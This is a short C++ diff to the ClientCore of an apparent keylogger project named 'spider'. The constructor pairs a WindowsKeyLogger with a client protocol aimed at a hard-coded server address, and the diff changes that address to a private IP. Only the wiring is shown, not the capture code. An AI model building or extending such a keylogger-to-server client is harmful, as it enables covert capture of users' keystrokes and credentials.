@@ -10,11 +10,10 @@
 
 #include "Protocol/Buffer.hpp"
 #include "Protocol/ClientProtocol.hpp"
-#include "Protocol/ServerProtocol.hpp"
 #include "KeyLogger/WindowsKeyLogger.hpp"
 #include "ClientCore.hpp"
 
-spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol("192.1.1.1", PORT)),
+spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol("10.26.112.233", PORT)),
 				   _keylogger(new spider::WindowsKeyLogger())
 {}
 
